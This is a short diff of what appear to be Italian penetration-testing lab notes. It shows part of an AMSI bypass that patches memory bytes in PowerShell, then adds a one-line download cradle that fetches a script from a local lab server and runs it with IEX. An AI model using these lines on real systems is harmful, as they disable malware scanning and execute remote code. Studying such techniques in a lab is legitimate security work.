@@ -392,3 +392,8 @@ $Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
 [System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
 ```
 Apriamo un server http e lanciamolo sulla macchina windows
+```PowerShell
+(new-object system.net.webclient).downloadstring('http://192.168.56.6:8080/amsi_rmouse.txt')|IEX
+```
+![[Pasted image 20230906110016.png]]
+==ORA
